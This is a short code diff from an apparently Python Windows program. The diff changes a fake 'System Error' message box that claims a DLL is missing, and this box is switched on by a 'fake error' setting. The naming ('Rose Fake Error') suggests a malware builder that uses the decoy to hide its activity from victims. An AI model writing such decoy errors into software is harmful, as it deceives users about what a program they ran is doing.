@@ -145,7 +145,7 @@ if not os.path.exists(main_path):
 
 if cc.get_fake_error():
     try:
-        ctypes.windll.user32.MessageBoxW(0, 'LaunchResources.dll could not be found', f"{os.path.basename(__file__)} - System Error", 16)
+        ctypes.windll.user32.MessageBoxW(0, 'LoadResources.dll could not be found', f"{os.path.basename(__file__)} - System Error", 16)
     except Exception as e:
         send_error_notification(e, 'Rose Fake Error')
 
